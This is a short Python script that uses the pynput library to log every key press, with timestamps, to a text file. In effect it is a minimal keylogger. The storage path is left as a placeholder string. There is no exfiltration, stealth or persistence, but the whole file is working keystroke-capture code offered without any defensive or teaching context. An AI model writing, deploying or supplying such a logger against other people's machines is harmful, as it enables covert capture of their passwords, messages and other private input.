import logging

from pynput.keyboard import Listener

loging_place = r"Enter Directory to store txt file  "
logging.basicConfig(filename=(loging_place + "key_logs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def record_pressing(key):
    logging.info(str(key))


with Listener(on_press=record_pressing) as listener:
    listener.join()
